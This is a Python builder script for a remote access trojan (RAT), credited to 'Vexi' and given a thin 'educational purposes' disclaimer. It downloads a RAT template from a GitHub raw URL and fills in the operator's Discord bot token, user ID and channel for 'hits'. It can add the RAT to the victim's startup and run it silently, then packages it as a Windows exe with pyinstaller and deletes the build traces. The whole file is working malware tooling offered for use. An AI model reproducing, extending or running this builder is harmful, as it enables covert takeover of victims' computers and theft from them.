# Disclaimer: This is only for entertainment and educational purposes.  
# I’m not responsible for what you do with it or any consequences.  
# Made by Vexi :3

import os
import time
import shutil
import requests
import base64
import urllib

try:
    import colorama
    colorama.init()
except Exception:
    if os.name == "nt":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.GetStdHandle(-11)  
            mode = ctypes.c_uint32()
            if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):

                kernel32.SetConsoleMode(handle, mode.value | 0x0004)
        except Exception:
            pass

def gradient(text):
    lines = text.splitlines()
    if not lines:
        return ""

    start_color = (120, 0, 0)
    end_color = (255, 60, 60)
    num_lines = len(lines)
    max_length = max((len(line) for line in lines), default=1)

    out_lines = []
    for li, line in enumerate(lines):

        line_ratio = li / (num_lines - 1) if num_lines > 1 else 0
        chars = []
        for ci, ch in enumerate(line):
            char_ratio = ci / (max_length - 1) if max_length > 1 else 0
            ratio = (line_ratio + char_ratio) / 2.0
            r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
            g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
            b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
            chars.append(f"\033[38;2;{r};{g};{b}m{ch}")

        out_lines.append("".join(chars) + RESET)
    return "\n".join(out_lines)

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
RESET = "\033[0m"

title = r"""
EXOZ-MT - Thanks to Vexi, this product is brought to you for free! 🎀
█████████████████████████████████████████████████████████████████████████████████

██████╗ ███████╗███╗   ███╗ ██████╗ ████████╗███████╗     █████╗  ██████╗ ██████╗███████╗███████╗███████╗    ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗
██╔══██╗██╔════╝████╗ ████║██╔═══██╗╚══██╔══╝██╔════╝    ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝    ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║
██████╔╝█████╗  ██╔████╔██║██║   ██║   ██║   █████╗      ███████║██║     ██║     █████╗  ███████╗███████╗       ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║
██╔══██╗██╔══╝  ██║╚██╔╝██║██║   ██║   ██║   ██╔══╝      ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║       ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║
██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝   ██║   ███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║       ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝       ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝

████████████████████████████████████████████████████████████████████
"""

print(gradient(title))

menu = """
[ 1 ] Build RAT file
[ 0 ] Exit
"""

print(gradient(menu))

choice = int(input(f"{BLUE}Select an option → {RESET}"))

if choice == 1:
    for x in range(0, 5):
        print(f"{RED}PLEASE DO NOT MESS UP THIS, OTHERWISE THE RAT WILL NOT WORK!")
        time.sleep(0.025)
        print(f"{YELLOW}PLEASE DO NOT MESS UP THIS, OTHERWISE THE RAT WILL NOT WORK!")
        time.sleep(0.01)

    understood = input(f"{RED}I Hope you understand that if you mess up this section, the RAT will NOT work. (press enter to continue) → {RESET}")

    file_name = input(f"\n{CYAN}What should the file be called. → {RESET}")
    token = input(f"{CYAN}Enter your bot's token. → {RESET}")
    whitelist = int(input(f"{CYAN}Enter your discord ID (this is so the bot only works for you). → {RESET}"))
    main_channel = int(input(f"{CYAN}Enter your main channel ID (the bot will ping you there when you get a hit). → {RESET}"))
    prefix = input(f"{CYAN}Enter your prefered prefix for the bot. → {RESET}")
    add_to_startup = input(f"{CYAN}Add file to victim's startup files? (true/false) → {RESET}").strip().title()
    silent_mode = input(f"{CYAN}Should the RAT be silent mode? (no console output) (true/false) → {RESET}").strip().title()

    template = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/RAT/ignore/template.py"
    source = requests.get(template).text

    if not file_name.lower().endswith(".py") or file_name.lower().endswith(".pyw"):
        if silent_mode == "True":
            file_name += ".pyw"
        else:
            file_name += ".py"

    if os.path.exists(file_name):
        response = input(f"{YELLOW}File '{file_name}' already exists. Overwrite? (y/n) → {RESET}").strip().lower()
        if response != 'y':
            exit()

    try:

        print(f"""
File name: {file_name}
Token: {token}
Whitelist ID: {whitelist}
Main Channel ID: {main_channel}
Prefix: {prefix}
Add To Victim's Startup: {add_to_startup}
Silent Mode: {silent_mode}""")

        confirm = input(f"\n{GREEN}Would you like to comfirm these? (y/n) → {RESET}").strip().lower()

        if confirm == "y":
            
            directory = os.path.dirname(os.path.abspath(__file__))
            
            print(f"{GREEN}Creating builds folder..")
            folder_path = os.path.join(directory, 'Builds')
            os.makedirs(folder_path, exist_ok=True)
            
            time.sleep(2)
            print(f"{GREEN}Builds folder created!")
            
            time.sleep(1)
            print(f"{GREEN}Creating rat file..{RESET}")
            
            file_path = os.path.join(folder_path, file_name)

            with open(file_path, 'w') as f:
                print(f"{GREEN}Rat file created!{RESET}")
                
                time.sleep(1)
                print(f"{GREEN}Writing file contents..{RESET}")

                modified_source = source
                
                modified_source = modified_source.replace("{placeholder_token}", token)
                modified_source = modified_source.replace("{placeholder_whitelist}", str(whitelist))
                modified_source = modified_source.replace("{placeholder_main_channel}", str(main_channel))
                modified_source = modified_source.replace("{placeholder_prefix}", prefix)
                modified_source = modified_source.replace("{placeholder_add_to_startup}", add_to_startup)
                modified_source = modified_source.replace("{placeholder_silent_mode}", silent_mode)

                f.write(modified_source)

                print(f"{GREEN}File contents have been written!{RESET}")
            
            time.sleep(1)
            print(f"{GREEN}Installing python to exe requirements{RESET}")
            os.system("pip install pyinstaller")
            print(f"{GREEN}Python to exe requirements installed!{RESET}")
            
            print(f"{GREEN}Converting python file to exe..{RESET}")
            
            original_dir = os.getcwd()
            os.chdir(folder_path)
            
            os.system(f'pyinstaller "{file_name}" --onefile')
            print(f"{GREEN}Converted python file to exe!{RESET}")
            
            time.sleep(4)
            print(f"{GREEN}Doing some finishing touches..{RESET}")

            build_path = os.path.join(folder_path, 'build')
            dist_path = os.path.join(folder_path, 'dist')
            
            if file_name.endswith('.py'):
                exe_file_name = file_name.replace('.py', '.exe')
                spec_file_name = file_name.replace('.py', '.spec')
            elif file_name.endswith('.pyw'):
                exe_file_name = file_name.replace('.pyw', '.exe')
                spec_file_name = file_name.replace('.pyw', '.spec')
            else:
                exe_file_name = file_name + '.exe'
                spec_file_name = file_name + '.spec'
            
            exe_path = os.path.join(dist_path, exe_file_name)
            spec_file = os.path.join(folder_path, spec_file_name)

            if os.path.exists(exe_path):
                final_exe_path = os.path.join(folder_path, exe_file_name)
                shutil.move(exe_path, final_exe_path)
                print(f"{GREEN}Moved EXE file to Builds folder{RESET}")
            
            if os.path.exists(file_path):
                os.remove(file_path)
                print(f"{GREEN}Deleted original Python file{RESET}")
            
            if os.path.exists(spec_file):
                os.remove(spec_file)
                print(f"{GREEN}Deleted .spec file{RESET}")
            
            time.sleep(0.5)
            
            if os.path.exists(build_path):
                try:
                    shutil.rmtree(build_path)
                    print(f"{GREEN}Deleted build folder{RESET}")
                except Exception as e:
                    print(f"{RED}Failed to delete build folder: {e}{RESET}")
                    print(f"{YELLOW}You may need to delete this folder maually.")
            
            time.sleep(0.5)
            
            if os.path.exists(dist_path) and os.path.isdir(dist_path):
                try:
                    shutil.rmtree(dist_path)
                    print(f"{GREEN}Deleted dist folder{RESET}")
                except Exception as e:
                    print(f"{RED}Failed to delete dist folder: {e}{RESET}")
                    print(f"{YELLOW}You may need to delete this folder maually.")
            
            os.chdir(original_dir)
            
            print(f"{GREEN}Finishing touches complete!{RESET}")

        else:
            exit()

        print(f"{CYAN}\n✅ SUCCESS! RAT has been made. \nRAT file located at: {os.path.join(folder_path, exe_file_name)}")
        input(f"{CYAN}Press enter to exit. → {RESET}")

    except Exception as e:
        print(f"{RED}Error creating file: {e}")

elif choice == 0:
    print("Exitting.")
